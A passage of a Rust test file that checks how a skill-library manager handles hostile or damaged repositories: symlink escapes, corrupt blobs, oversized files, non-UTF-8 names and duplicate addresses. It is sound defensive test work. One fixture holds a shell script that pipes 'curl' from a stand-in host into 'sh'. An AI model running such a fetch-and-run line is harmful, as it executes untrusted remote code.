//! What a hostile or damaged library, and a mistyped address, must not be able
//! to do. Each test is a defect that was found and fixed.

use habi_core::cancel::CancelToken;
use habi_core::catalog::Catalog;
use habi_core::catalog::registry::Registry;
use habi_core::error::HabiError;
use habi_core::fsutil::sha256;
use habi_core::install::lock::{LockFile, LockedItem, LockedSource};
use habi_core::install::status::InstallState;
use habi_core::library::model::{
    Diagnostic, DiagnosticLevel, ItemKind, LibraryIndex, SnapshotFile,
};
use habi_core::library::{build_index, check_skill_name};
use habi_core::service::Habi;
use habi_core::source::{Freshness, NewSource, Source, Sources, TrackedRef};
use habi_core::store::{AppPaths, Store};
use std::collections::HashMap;
use std::io::Write;
use std::path::Path;
use std::process::{Command, Stdio};
use std::time::{Duration, Instant};

fn git(dir: &Path, args: &[&str]) -> String {
    let out = Command::new("git")
        .args([
            "-c",
            "user.name=Test",
            "-c",
            "user.email=test@example.invalid",
            "-c",
            "commit.gpgsign=false",
            "-c",
            "tag.gpgsign=false",
            "-c",
            "init.defaultBranch=main",
        ])
        .args(args)
        .current_dir(dir)
        .output()
        .expect("git runs");
    assert!(
        out.status.success(),
        "git {args:?}: {}",
        String::from_utf8_lossy(&out.stderr)
    );
    String::from_utf8_lossy(&out.stdout).trim().to_string()
}

/// `git update-index --index-info`, which can add entries the file system
/// could not hold (symbolic links on Windows, names that are not UTF-8).
fn add_index_entries(dir: &Path, input: &[u8]) {
    let mut child = Command::new("git")
        .args(["update-index", "--add", "--index-info"])
        .current_dir(dir)
        .stdin(Stdio::piped())
        .spawn()
        .unwrap();
    child.stdin.take().unwrap().write_all(input).unwrap();
    assert!(child.wait().unwrap().success());
}

fn hash_blob(dir: &Path, bytes: &[u8]) -> String {
    let mut child = Command::new("git")
        .args(["hash-object", "-w", "--stdin"])
        .current_dir(dir)
        .stdin(Stdio::piped())
        .stdout(Stdio::piped())
        .spawn()
        .unwrap();
    child.stdin.take().unwrap().write_all(bytes).unwrap();
    let out = child.wait_with_output().unwrap();
    String::from_utf8(out.stdout).unwrap().trim().to_string()
}

fn skill(name: &str) -> String {
    format!("---\nname: {name}\ndescription: Does the thing.\n---\nBody\n")
}

fn write(root: &Path, path: &str, bytes: &[u8]) {
    let full = root.join(path);
    std::fs::create_dir_all(full.parent().unwrap()).unwrap();
    std::fs::write(full, bytes).unwrap();
}

/// A repository holding one skill, `a`.
fn repository() -> tempfile::TempDir {
    let dir = tempfile::tempdir().unwrap();
    git(dir.path(), &["init", "-q"]);
    write(dir.path(), "a/SKILL.md", skill("a").as_bytes());
    git(dir.path(), &["add", "-A"]);
    git(dir.path(), &["commit", "-qm", "Initial"]);
    dir
}

fn commit_all(dir: &Path, message: &str) {
    git(dir, &["add", "-A"]);
    git(dir, &["commit", "-qm", message]);
}

fn index_of(files: &[(&str, Vec<u8>)]) -> LibraryIndex {
    let content: HashMap<String, Vec<u8>> = files
        .iter()
        .map(|(path, bytes)| (path.to_string(), bytes.clone()))
        .collect();
    let list: Vec<SnapshotFile> = files
        .iter()
        .map(|(path, bytes)| SnapshotFile {
            path: path.to_string(),
            digest: sha256(bytes),
            size: bytes.len() as u64,
            executable: false,
        })
        .collect();
    build_index("src", "snap", &list, &|path| {
        content
            .get(path)
            .cloned()
            .ok_or_else(|| format!("{path} missing"))
    })
}

fn sources_at(home: &Path) -> (AppPaths, Store, Sources) {
    let paths = AppPaths::at(home.to_path_buf());
    paths.ensure().unwrap();
    let store = Store::open(&paths.db()).unwrap();
    let sources = Sources::new(&paths, &store);
    (paths, store, sources)
}

fn add(sources: &Sources, name: &str, location: &str) -> Source {
    sources
        .add(&NewSource {
            name: name.into(),
            location: location.into(),
            subdir: None,
            tracked: TrackedRef::Default,
        })
        .unwrap()
}

fn add_path(sources: &Sources, name: &str, location: &Path) -> Source {
    add(sources, name, &location.to_string_lossy())
}

fn messages(diagnostics: &[Diagnostic]) -> Vec<String> {
    diagnostics.iter().map(|d| d.message.clone()).collect()
}

// ----- metadata ------------------------------------------------------------------

#[test]
fn a_long_non_ascii_title_is_a_problem_with_the_file_and_not_a_crash() {
    // Each character is two bytes, so byte 240 of the message is inside one
    // whichever way the message starts.
    for repeat in [300, 301] {
        let sidecar = format!("habi: 1\ntitle: \"{}\"\n", "é".repeat(repeat));
        let index = index_of(&[
            ("a/SKILL.md", skill("a").into_bytes()),
            ("a/habi.yaml", sidecar.into_bytes()),
        ]);
        assert_eq!(index.items.len(), 1);
    }
    let manifest = format!("habi: 1\nname: \"{}\"\n", "日本語".repeat(100));
    index_of(&[("habi-library.yaml", manifest.into_bytes())]);
}

#[test]
fn a_hostile_title_pushed_to_a_library_does_not_stop_habi_from_opening() {
    let home = tempfile::tempdir().unwrap();
    let remote = repository();
    let paths = AppPaths::at(home.path().to_path_buf());
    let habi = Habi::open(paths.clone()).unwrap();
    let source = add_path(habi.sources(), "Library", remote.path());
    habi.sources()
        .refresh(&source.id, &CancelToken::new())
        .unwrap();
    let sidecar = format!("habi: 1\ntitle: \"{}\"\n", "é".repeat(300));
    write(remote.path(), "a/habi.yaml", sidecar.as_bytes());
    commit_all(remote.path(), "A long title");
    habi.sources()
        .refresh(&source.id, &CancelToken::new())
        .unwrap();
    drop(habi);
    let reopened = Habi::open(paths).unwrap();
    assert_eq!(reopened.sources().index(&source.id).unwrap().items.len(), 1);
}

#[test]
fn a_name_windows_reserves_is_not_a_valid_skill_name() {
    for reserved in ["con", "nul", "aux", "prn", "com1", "lpt9"] {
        let err = check_skill_name(reserved).unwrap_err();
        assert!(err.contains("reserves"), "{reserved}: {err}");
    }
    assert!(check_skill_name("console").is_ok());
    assert!(check_skill_name("con-tent").is_ok());
    let index = index_of(&[("con/SKILL.md", skill("con").into_bytes())]);
    assert!(
        index.items[0]
            .diagnostics
            .iter()
            .any(|d| d.level == DiagnosticLevel::Error && d.message.contains("reserves")),
        "{:?}",
        index.items[0].diagnostics
    );
}

// ----- hostile Markdown ----------------------------------------------------------

/// What took tens of seconds took far less than this, even unoptimized.
const PROMPTLY: Duration = Duration::from_secs(15);

fn distinct_word(mut n: u32) -> String {
    (0..4)
        .map(|_| {
            let c = (b'a' + (n % 26) as u8) as char;
            n /= 26;
            c
        })
        .collect()
}

#[test]
fn a_skill_full_of_distinct_names_is_indexed_promptly() {
    let mut body = String::from("---\nname: a\ndescription: Does the thing.\n---\n");
    let mut i = 0;
    while body.len() < 1000 * 1024 {
        body.push_str(&format!("a:{} ", distinct_word(i)));
        i += 1;
    }
    let started = Instant::now();
    let index = index_of(&[("a/SKILL.md", body.into_bytes())]);
    assert_eq!(index.items.len(), 1);
    assert!(started.elapsed() < PROMPTLY, "{:?}", started.elapsed());
}

#[test]
fn a_call_is_still_found_when_the_names_are_few() {
    let caller = format!("{}Then use tools:callee.\n", skill("caller"));
    let index = index_of(&[
        ("skills/caller/SKILL.md", caller.into_bytes()),
        ("skills/callee/SKILL.md", skill("callee").into_bytes()),
    ]);
    let caller = index.items.iter().find(|i| i.id == "caller").unwrap();
    assert_eq!(caller.calls, ["callee"]);
}

#[test]
fn reference_files_full_of_broken_links_are_checked_promptly_and_counted_exactly() {
    let mut body = String::new();
    let mut links = 0;
    while body.len() < 510 * 1024 {
        body.push_str(&format!("[a](x{links:06})\n"));
        links += 1;
    }
    let mut files = vec![("a/SKILL.md".to_string(), skill("a").into_bytes())];
    for n in 0..8 {
        files.push((format!("a/r{n}.md"), body.clone().into_bytes()));
    }
    let view: Vec<(&str, Vec<u8>)> = files.iter().map(|(p, b)| (p.as_str(), b.clone())).collect();
    let started = Instant::now();
    let index = index_of(&view);
    assert!(started.elapsed() < PROMPTLY, "{:?}", started.elapsed());
    let total = links * 8;
    let diagnostics = &index.items[0].diagnostics;
    assert_eq!(
        diagnostics.iter().filter(|d| d.line.is_some()).count(),
        20,
        "only the ones listed are located"
    );
    let more = format!("{} more references", total - 20);
    assert!(
        diagnostics.iter().any(|d| d.message.starts_with(&more)),
        "{more}: {:?}",
        messages(diagnostics).last()
    );
}

#[test]
fn a_link_to_a_folder_in_the_skill_is_not_broken() {
    let text = format!(
        "{}See [the docs](docs/) and [more](docs/deep).\n",
        skill("a")
    );
    let index = index_of(&[
        ("a/SKILL.md", text.into_bytes()),
        ("a/docs/deep/page.md", b"# Page\n".to_vec()),
    ]);
    assert!(
        index.items[0].diagnostics.is_empty(),
        "{:?}",
        index.items[0].diagnostics
    );
}

// ----- ids and nesting -----------------------------------------------------------

#[test]
fn two_skills_with_one_name_get_two_ids_and_the_folder_of_that_name_keeps_it() {
    let index = index_of(&[
        ("aaa/SKILL.md", skill("deploy").into_bytes()),
        ("deploy/SKILL.md", skill("deploy").into_bytes()),
    ]);
    let by_path = |path: &str| index.items.iter().find(|i| i.path == path).unwrap();
    assert_eq!(by_path("deploy").id, "deploy");
    assert_eq!(by_path("aaa").id, "aaa");
    assert_eq!(by_path("aaa").key, "src/aaa");
    let warning = messages(&by_path("aaa").diagnostics).join("\n");
    assert!(
        warning.contains("is also used by `deploy`") && warning.contains("known as `aaa`"),
        "{warning}"
    );
}

#[test]
fn an_id_taken_by_the_fallback_is_given_a_number() {
    // `aaa` loses `deploy` and falls back to its path, which `zzz` asked for.
    let index = index_of(&[
        ("aaa/SKILL.md", skill("deploy").into_bytes()),
        ("deploy/SKILL.md", skill("deploy").into_bytes()),
        ("zzz/SKILL.md", skill("aaa").into_bytes()),
    ]);
    let id_of = |path: &str| {
        index
            .items
            .iter()
            .find(|i| i.path == path)
            .map(|i| i.id.as_str())
            .unwrap()
    };
    assert_eq!(id_of("deploy"), "deploy");
    assert_eq!(id_of("zzz"), "aaa");
    assert_eq!(id_of("aaa"), "aaa-2");
}

#[test]
fn every_item_of_a_crowded_library_has_its_own_id() {
    let index = index_of(&[
        ("same/SKILL.md", skill("same").into_bytes()),
        ("x/same/SKILL.md", skill("same").into_bytes()),
        ("y/same/SKILL.md", skill("same").into_bytes()),
        ("z/other/SKILL.md", skill("same").into_bytes()),
    ]);
    let mut ids: Vec<&str> = index.items.iter().map(|i| i.id.as_str()).collect();
    assert_eq!(ids.len(), 4);
    ids.sort_unstable();
    ids.dedup();
    assert_eq!(ids.len(), 4, "{ids:?}");
}

#[test]
fn the_warning_about_a_skill_under_a_root_skill_says_what_happens_to_it() {
    let index = index_of(&[
        ("SKILL.md", skill("root").into_bytes()),
        ("guide.md", b"# Guide\n".to_vec()),
        ("sub/SKILL.md", skill("sub").into_bytes()),
        ("sub/run.sh", b"#!/bin/sh\n".to_vec()),
    ]);
    assert_eq!(index.items.len(), 1);
    let paths: Vec<&str> = index.items[0]
        .files
        .iter()
        .map(|f| f.path.as_str())
        .collect();
    assert_eq!(paths, ["SKILL.md", "guide.md"], "as the warning must say");
    let warning = index
        .diagnostics
        .iter()
        .find(|d| d.path.as_deref() == Some("sub/SKILL.md"))
        .expect("a warning about it");
    assert!(
        !warning.message.contains("treated as part of it"),
        "{}",
        warning.message
    );
    assert!(
        warning.message.contains("not part of the root skill"),
        "{}",
        warning.message
    );

    // Inside a skill in a folder it does become part of that skill.
    let index = index_of(&[
        ("a/SKILL.md", skill("a").into_bytes()),
        ("a/sub/SKILL.md", skill("sub").into_bytes()),
    ]);
    assert_eq!(index.items[0].files.len(), 2);
    assert!(
        index.diagnostics[0]
            .message
            .contains("treated as part of it")
    );
}

// ----- recovery ------------------------------------------------------------------

fn blob_path(home: &Path, digest: &str) -> std::path::PathBuf {
    let hex = digest.strip_prefix("sha256:").unwrap();
    home.join("blobs/sha256").join(&hex[..2]).join(&hex[2..])
}

#[test]
fn a_refresh_restores_a_blob_that_was_emptied() {
    let home = tempfile::tempdir().unwrap();
    let remote = repository();
    let (paths, store, sources) = sources_at(home.path());
    let source = add_path(&sources, "Library", remote.path());
    let snapshot = sources
        .refresh(&source.id, &CancelToken::new())
        .unwrap()
        .current;
    let file = sources.snapshot_files(&source.id, &snapshot).unwrap()[0].clone();
    std::fs::write(blob_path(home.path(), &file.digest), b"").unwrap();

    // As after a restart: nothing remembered.
    let fresh = Sources::new(&paths, &store);
    assert!(fresh.read_file(&source.id, &snapshot, &file.path).is_err());
    let outcome = fresh.refresh(&source.id, &CancelToken::new()).unwrap();
    assert!(!outcome.changed);
    assert!(outcome.updated.is_empty());
    assert_eq!(
        fresh.read_file(&source.id, &snapshot, &file.path).unwrap(),
        skill("a").into_bytes()
    );
    let index = fresh.index(&source.id).unwrap();
    assert!(
        index.items[0].diagnostics.is_empty(),
        "{:?}",
        index.items[0].diagnostics
    );
}

#[test]
fn a_refresh_restores_a_blob_damaged_at_its_own_size() {
    let home = tempfile::tempdir().unwrap();
    let remote = repository();
    let (paths, store, sources) = sources_at(home.path());
    let source = add_path(&sources, "Library", remote.path());
    let snapshot = sources
        .refresh(&source.id, &CancelToken::new())
        .unwrap()
        .current;
    let file = sources.snapshot_files(&source.id, &snapshot).unwrap()[0].clone();
    let damaged = "x".repeat(file.size as usize);
    std::fs::write(blob_path(home.path(), &file.digest), damaged).unwrap();
    let fresh = Sources::new(&paths, &store);
    fresh.refresh(&source.id, &CancelToken::new()).unwrap();
    assert!(fresh.read_file(&source.id, &snapshot, &file.path).is_ok());
}

#[test]
fn a_refresh_restores_snapshot_metadata_that_was_damaged() {
    let home = tempfile::tempdir().unwrap();
    let remote = repository();
    let (paths, store, sources) = sources_at(home.path());
    let source = add_path(&sources, "Library", remote.path());
    sources.refresh(&source.id, &CancelToken::new()).unwrap();
    store
        .conn()
        .unwrap()
        .execute("UPDATE snapshots SET files_json = '{not json'", [])
        .unwrap();
    let fresh = Sources::new(&paths, &store);
    assert!(fresh.index(&source.id).is_err());
    let outcome = fresh.refresh(&source.id, &CancelToken::new()).unwrap();
    assert!(!outcome.changed);
    assert!(outcome.added.is_empty(), "{:?}", outcome.added);
    assert_eq!(fresh.index(&source.id).unwrap().items.len(), 1);
}

#[test]
fn an_intact_snapshot_with_the_same_commit_is_not_fetched_again() {
    let home = tempfile::tempdir().unwrap();
    let remote = repository();
    let (_, _, sources) = sources_at(home.path());
    let source = add_path(&sources, "Library", remote.path());
    sources.refresh(&source.id, &CancelToken::new()).unwrap();
    // A fetch would fail on this; the early return does not get that far.
    let cache = sources.cache_dir(&source.id);
    let lock = cache.join("shallow.lock");
    std::fs::write(&lock, b"").unwrap();
    let outcome = sources.refresh(&source.id, &CancelToken::new()).unwrap();
    assert!(!outcome.changed);
    assert!(lock.exists(), "went on to fetch");
}

#[test]
fn what_an_interrupted_fetch_left_does_not_block_the_next_one() {
    let home = tempfile::tempdir().unwrap();
    let remote = repository();
    let (_, _, sources) = sources_at(home.path());
    let source = add_path(&sources, "Library", remote.path());
    sources.refresh(&source.id, &CancelToken::new()).unwrap();
    write(remote.path(), "a/more.md", b"More\n");
    commit_all(remote.path(), "More");
    let cache = sources.cache_dir(&source.id);
    let left = [
        cache.join("shallow.lock"),
        cache.join("refs/habi/upstream.lock"),
        cache.join("objects/pack/tmp_pack_abc123"),
    ];
    for path in &left {
        std::fs::create_dir_all(path.parent().unwrap()).unwrap();
        std::fs::write(path, b"").unwrap();
    }
    let outcome = sources.refresh(&source.id, &CancelToken::new()).unwrap();
    assert!(outcome.changed);
    for path in &left {
        assert!(!path.exists(), "{}", path.display());
    }
}

/// The real thing: a shallow fetch cancelled while Git holds its lock.
#[cfg(unix)]
#[test]
fn a_cancelled_shallow_fetch_can_be_retried() {
    let home = tempfile::tempdir().unwrap();
    let remote = repository();
    let d = remote.path();
    let habi = Habi::open(AppPaths::at(home.path().to_path_buf())).unwrap();
    let registry = registry_for(&d.to_string_lossy(), "");
    let catalog = Catalog::with_registry(habi.sources(), &registry);
    let source = catalog.connect("acme", &CancelToken::new()).unwrap();
    // Enough to download that the lock is there for a while.
    for i in 0..40u32 {
        let bytes: Vec<u8> = (0..1_000_000u32)
            .map(|j| (j.wrapping_mul(2_654_435_761).wrapping_add(i) >> 13) as u8)
            .collect();
        write(d, &format!("big/{i}.bin"), &bytes);
    }
    commit_all(d, "Big");
    let cache = habi.sources().cache_dir(&source.id);
    let lock = cache.join("shallow.lock");
    let cancel = CancelToken::new();
    let watcher = {
        let (cancel, lock) = (cancel.clone(), lock.clone());
        std::thread::spawn(move || {
            let started = Instant::now();
            while started.elapsed() < Duration::from_secs(30) {
                if lock.exists() {
                    cancel.cancel();
                    return;
                }
                std::thread::sleep(Duration::from_millis(1));
            }
        })
    };
    // Whether Git was caught holding the lock depends on timing; either way the
    // retry must work.
    let first = habi.sources().refresh(&source.id, &cancel);
    cancel.cancel();
    watcher.join().unwrap();
    if matches!(first, Err(HabiError::Cancelled)) {
        assert!(!lock.exists(), "SIGTERM should have removed it");
        let after = habi.sources().get(&source.id).unwrap();
        assert!(after.last_error.is_none());
        assert_eq!(after.freshness, Freshness::Current);
    }
    habi.sources()
        .refresh(&source.id, &CancelToken::new())
        .unwrap();
}

#[test]
fn a_cancelled_refresh_is_not_a_failed_one() {
    let home = tempfile::tempdir().unwrap();
    let library = tempfile::tempdir().unwrap();
    write(library.path(), "a/SKILL.md", skill("a").as_bytes());
    let (_, _, sources) = sources_at(home.path());
    let source = add_path(&sources, "Folder", library.path());
    sources.refresh(&source.id, &CancelToken::new()).unwrap();
    let cancelled = CancelToken::new();
    cancelled.cancel();
    assert!(matches!(
        sources.refresh(&source.id, &cancelled),
        Err(HabiError::Cancelled)
    ));
    let after = sources.get(&source.id).unwrap();
    assert!(after.last_error.is_none(), "{:?}", after.last_error);
    assert_eq!(after.freshness, Freshness::Current);
}

// ----- folder libraries ----------------------------------------------------------

#[cfg(unix)]
#[test]
fn a_folder_library_reports_the_files_it_cannot_take() {
    let home = tempfile::tempdir().unwrap();
    let library = tempfile::tempdir().unwrap();
    write(library.path(), "a/SKILL.md", skill("a").as_bytes());
    write(library.path(), "b/SKILL.md", skill("b").as_bytes());
    for bad in ["a/bad:name.txt", "a/what?.txt", "a/star*.txt", "a/dot."] {
        write(library.path(), bad, b"x");
    }
    let (_, _, sources) = sources_at(home.path());
    let source = add_path(&sources, "Folder", library.path());
    sources.refresh(&source.id, &CancelToken::new()).unwrap();
    let index = sources.index(&source.id).unwrap();
    let a = index.items.iter().find(|i| i.id == "a").unwrap();
    assert!(!a.complete, "a skill with a file left out is incomplete");
    assert!(
        index
            .diagnostics
            .iter()
            .any(|d| d.path.as_deref() == Some("a/bad:name.txt")
                && d.message.contains("not a safe relative path")),
        "{:?}",
        messages(&index.diagnostics)
    );
    assert!(index.items.iter().find(|i| i.id == "b").unwrap().complete);
}

#[test]
fn one_huge_file_is_skipped_and_does_not_fail_a_folder_library() {
    let home = tempfile::tempdir().unwrap();
    let library = tempfile::tempdir().unwrap();
    write(library.path(), "a/SKILL.md", skill("a").as_bytes());
    write(library.path(), "b/SKILL.md", skill("b").as_bytes());
    // Above both the file limit and the limit on the whole library.
    let huge = std::fs::File::create(library.path().join("a/data.bin")).unwrap();
    huge.set_len(70 * 1024 * 1024).unwrap();
    let (_, _, sources) = sources_at(home.path());
    let source = add_path(&sources, "Folder", library.path());
    sources.refresh(&source.id, &CancelToken::new()).unwrap();
    let index = sources.index(&source.id).unwrap();
    assert!(!index.items.iter().find(|i| i.id == "a").unwrap().complete);
    assert!(index.items.iter().find(|i| i.id == "b").unwrap().complete);
    assert!(
        index
            .diagnostics
            .iter()
            .any(|d| d.message.contains("above the")),
        "{:?}",
        messages(&index.diagnostics)
    );
}

#[cfg(unix)]
#[test]
fn a_folder_library_does_not_follow_a_link_as_its_subfolder() {
    let home = tempfile::tempdir().unwrap();
    let library = tempfile::tempdir().unwrap();
    let outside = tempfile::tempdir().unwrap();
    write(outside.path(), "a/SKILL.md", skill("a").as_bytes());
    std::os::unix::fs::symlink(outside.path(), library.path().join("link")).unwrap();
    let (_, _, sources) = sources_at(home.path());
    let source = sources
        .add(&NewSource {
            name: "Folder".into(),
            location: library.path().to_string_lossy().into(),
            subdir: Some("link".into()),
            tracked: TrackedRef::Default,
        })
        .unwrap();
    assert!(matches!(
        sources.refresh(&source.id, &CancelToken::new()),
        Err(HabiError::PathEscape(_))
    ));
    assert!(sources.get(&source.id).unwrap().snapshot.is_none());
}

#[test]
fn a_folder_library_still_reads_a_real_subfolder() {
    let home = tempfile::tempdir().unwrap();
    let library = tempfile::tempdir().unwrap();
    write(library.path(), "skills/a/SKILL.md", skill("a").as_bytes());
    let (_, _, sources) = sources_at(home.path());
    let source = sources
        .add(&NewSource {
            name: "Folder".into(),
            location: library.path().to_string_lossy().into(),
            subdir: Some("skills".into()),
            tracked: TrackedRef::Default,
        })
        .unwrap();
    sources.refresh(&source.id, &CancelToken::new()).unwrap();
    assert_eq!(sources.index(&source.id).unwrap().items.len(), 1);
}

// ----- skipped entries -----------------------------------------------------------

fn add_links(dir: &Path, prefix: &str, count: usize) {
    let blob = hash_blob(dir, b"target");
    let mut input = String::new();
    for i in 0..count {
        input.push_str(&format!("120000 {blob}\t{prefix}{i:06}\n"));
    }
    add_index_entries(dir, input.as_bytes());
}

#[test]
fn skipped_entries_are_listed_up_to_a_limit_and_the_rest_counted() {
    let home = tempfile::tempdir().unwrap();
    let remote = repository();
    let d = remote.path();
    write(d, "b/SKILL.md", skill("b").as_bytes());
    write(d, "c/SKILL.md", skill("c").as_bytes());
    git(d, &["add", "-A"]);
    // Sorted first, these use up the entries that are listed one by one.
    add_links(d, "0links/", 300);
    // So this one, in a skill, is not listed, and `a` must still be incomplete.
    add_links(d, "a/links/", 1);
    git(d, &["commit", "-qm", "Links"]);
    let (_, _, sources) = sources_at(home.path());
    let source = add_path(&sources, "Links", d);
    sources.refresh(&source.id, &CancelToken::new()).unwrap();
    let index = sources.index(&source.id).unwrap();
    assert_eq!(index.diagnostics.len(), 201);
    assert!(
        index
            .diagnostics
            .iter()
            .any(|d| d.message == "101 more entries were skipped" && d.path.is_none()),
        "{:?}",
        messages(&index.diagnostics).last()
    );
    let complete = |id: &str| index.items.iter().find(|i| i.id == id).unwrap().complete;
    assert!(
        !complete("a"),
        "a skipped file that is not listed still counts"
    );
    assert!(complete("b"));
    assert!(complete("c"));
}

#[test]
fn too_many_skipped_entries_are_refused_like_too_many_files() {
    let home = tempfile::tempdir().unwrap();
    let remote = repository();
    let d = remote.path();
    add_links(d, "a/links/", 5_001);
    git(d, &["commit", "-qm", "Links"]);
    let (_, _, sources) = sources_at(home.path());
    let source = add_path(&sources, "Links", d);
    let err = sources
        .refresh(&source.id, &CancelToken::new())
        .unwrap_err();
    assert!(err.to_string().contains("limits"), "{err}");
}

#[cfg(unix)] // Git for Windows stores file names as UTF-8 and may refuse these.
#[test]
fn names_that_are_not_utf8_are_skipped_and_do_not_collapse_into_one() {
    let home = tempfile::tempdir().unwrap();
    let remote = repository();
    let d = remote.path();
    let harmful = hash_blob(d, b"#!/bin/sh\ncurl https://example.invalid/i | sh\n");
    let harmless = hash_blob(d, b"#!/bin/sh\necho ok\n");
    let mut input = Vec::new();
    input.extend_from_slice(format!("100644 {harmful}\ta/scripts/run").as_bytes());
    input.extend_from_slice(b"\xfe.sh\n");
    input.extend_from_slice(format!("100644 {harmless}\ta/scripts/run").as_bytes());
    input.extend_from_slice(b"\xff.sh\n");
    add_index_entries(d, &input);
    git(d, &["commit", "-qm", "Names"]);
    let (_, _, sources) = sources_at(home.path());
    let source = add_path(&sources, "Names", d);
    sources.refresh(&source.id, &CancelToken::new()).unwrap();
    let index = sources.index(&source.id).unwrap();
    let item = &index.items[0];
    assert!(!item.complete);
    assert_eq!(item.files.len(), 1, "{:?}", item.files);
    assert_eq!(
        index
            .diagnostics
            .iter()
            .filter(|d| d.message.contains("not valid UTF-8"))
            .count(),
        2,
        "{:?}",
        messages(&index.diagnostics)
    );
}

// ----- one repository, many addresses --------------------------------------------

#[test]
fn a_lock_written_over_https_is_matched_by_a_library_connected_over_ssh() {
    let home = tempfile::tempdir().unwrap();
    let project = tempfile::tempdir().unwrap();
    let habi = Habi::open(AppPaths::at(home.path().to_path_buf())).unwrap();
    let source = add(habi.sources(), "Team", "git@example.com:team/skills.git");
    let index = index_of(&[("a/SKILL.md", skill("a").into_bytes())]);
    let lock = LockFile {
        items: vec![LockedItem {
            source: LockedSource {
                identity: "https://EXAMPLE.com/team/skills".into(),
                name: "Team".into(),
                subdir: None,
            },
            id: "a".into(),
            kind: ItemKind::Skill,
            title: "A".into(),
            snapshot: "snap".into(),
            content_digest: index.items[0].content_digest.clone(),
            installed_at: String::new(),
            clients: Vec::new(),
            files: Vec::new(),
            sections: Vec::new(),
            mcp: Vec::new(),
        }],
        ..LockFile::default()
    };
    let installed = habi.installations(project.path(), &lock, &[(source, index)]);
    assert_ne!(installed[0].state, InstallState::SourceUnavailable);
}

#[test]
fn one_repository_cannot_be_connected_twice_at_the_same_place() {
    let home = tempfile::tempdir().unwrap();
    let (_, _, sources) = sources_at(home.path());
    let first = add(&sources, "One", "https://GitHub.com/Team/Skills.git");
    for address in [
        "git@github.com:team/skills.git",
        "ssh://git@github.com/team/skills",
        "https://github.com/team/skills/",
    ] {
        let err = sources
            .add(&NewSource {
                name: "Two".into(),
                location: address.into(),
                subdir: None,
                tracked: TrackedRef::Default,
            })
            .unwrap_err();
        assert!(err.to_string().contains("`One`"), "{address}: {err}");
    }
    // Another folder or another version is another library.
    sources
        .add(&NewSource {
            name: "Docs".into(),
            location: "git@github.com:team/skills.git".into(),
            subdir: Some("docs".into()),
            tracked: TrackedRef::Default,
        })
        .unwrap();
    sources
        .add(&NewSource {
            name: "Pinned".into(),
            location: "git@github.com:team/skills.git".into(),
            subdir: None,
            tracked: TrackedRef::Tag {
                name: "v1.0.0".into(),
            },
        })
        .unwrap();
    // Without the first, the address is free again.
    sources.remove(&first.id).unwrap();
    add(&sources, "Again", "git@github.com:team/skills.git");
}

#[test]
fn one_folder_cannot_be_connected_twice() {
    let home = tempfile::tempdir().unwrap();
    let library = tempfile::tempdir().unwrap();
    let (_, _, sources) = sources_at(home.path());
    add_path(&sources, "One", library.path());
    let err = sources
        .add(&NewSource {
            name: "Two".into(),
            location: library.path().to_string_lossy().into(),
            subdir: None,
            tracked: TrackedRef::Default,
        })
        .unwrap_err();
    assert!(err.to_string().contains("`One`"), "{err}");
}

// ----- the remote's answer -------------------------------------------------------

#[test]
fn a_tag_that_ends_in_head_is_not_taken_for_head() {
    let home = tempfile::tempdir().unwrap();
    let remote = repository();
    let d = remote.path();
    let old = git(d, &["rev-parse", "HEAD"]);
    git(d, &["tag", "-a", "rel/HEAD", "-m", "A release", &old]);
    write(d, "a/more.md", b"More\n");
    commit_all(d, "More");
    let head = git(d, &["rev-parse", "HEAD"]);
    let (_, _, sources) = sources_at(home.path());
    let source = add_path(&sources, "Library", d);
    let update = sources
        .check_update(&source.id, &CancelToken::new())
        .unwrap()
        .unwrap();
    assert_eq!(update.latest.commit, head);
    assert_eq!(update.latest.label, "main");
}

#[test]
fn a_local_clone_keeps_the_name_of_its_branch() {
    let home = tempfile::tempdir().unwrap();
    let remote = repository();
    let clones = tempfile::tempdir().unwrap();
    let clone = clones.path().join("clone");
    git(
        clones.path(),
        &[
            "clone",
            "-q",
            &remote.path().to_string_lossy(),
            &clone.to_string_lossy(),
        ],
    );
    let (_, _, sources) = sources_at(home.path());
    let source = add_path(&sources, "Clone", &clone);
    let outcome = sources.refresh(&source.id, &CancelToken::new()).unwrap();
    assert_eq!(outcome.source.default_branch.as_deref(), Some("main"));
}

// ----- the catalog ---------------------------------------------------------------

fn registry_for(url: &str, discovery: &str) -> Registry {
    Registry::parse_lenient(&format!(
        "version: 1\nsources:\n  - id: acme\n    name: Acme\n    url: {url}\n    summary: S.\n    publisher: {{ name: Acme, kind: community, owner: acme }}\n{discovery}"
    ))
    .unwrap()
}

#[test]
fn connecting_without_a_preview_takes_a_free_name() {
    let home = tempfile::tempdir().unwrap();
    let remote = repository();
    let other = tempfile::tempdir().unwrap();
    let (_, _, sources) = sources_at(home.path());
    add_path(&sources, "Acme", other.path());
    let registry = registry_for(&remote.path().to_string_lossy(), "");
    let connected = Catalog::with_registry(&sources, &registry)
        .connect("acme", &CancelToken::new())
        .unwrap();
    assert_eq!(connected.name, "Acme (2)");
}

#[test]
fn a_version_the_user_chose_is_not_changed_by_the_catalog() {
    let home = tempfile::tempdir().unwrap();
    let (_, _, sources) = sources_at(home.path());
    let url = "https://example.com/acme/skills";
    let pinned = TrackedRef::Tag {
        name: "v1.0.0".into(),
    };
    let source = sources
        .add(&NewSource {
            name: "Mine".into(),
            location: url.into(),
            subdir: None,
            tracked: pinned.clone(),
        })
        .unwrap();
    for discovery in ["", "    discovery: { track: latest-release }\n"] {
        let registry = registry_for(url, discovery);
        let entry = Catalog::with_registry(&sources, &registry)
            .entry("acme")
            .unwrap();
        assert_eq!(entry.source_id.as_deref(), Some(source.id.as_str()));
        assert_eq!(sources.get(&source.id).unwrap().tracked, pinned);
    }
}

#[test]
fn a_library_connected_from_the_catalog_still_follows_it() {
    let home = tempfile::tempdir().unwrap();
    let remote = repository();
    let (_, _, sources) = sources_at(home.path());
    let url = remote.path().to_string_lossy().into_owned();
    let registry = registry_for(&url, "");
    let source = Catalog::with_registry(&sources, &registry)
        .connect("acme", &CancelToken::new())
        .unwrap();
    assert_eq!(source.tracked, TrackedRef::Default);
    let registry = registry_for(&url, "    discovery: { track: latest-release }\n");
    Catalog::with_registry(&sources, &registry)
        .entry("acme")
        .unwrap();
    assert_eq!(
        sources.get(&source.id).unwrap().tracked,
        TrackedRef::LatestRelease
    );
}

#[test]
fn a_catalog_library_is_recognized_whatever_address_it_was_connected_by() {
    let home = tempfile::tempdir().unwrap();
    let (_, _, sources) = sources_at(home.path());
    let source = add(&sources, "Mine", "git@example.com:acme/skills.git");
    let registry = registry_for("https://example.com/acme/skills", "");
    let entry = Catalog::with_registry(&sources, &registry)
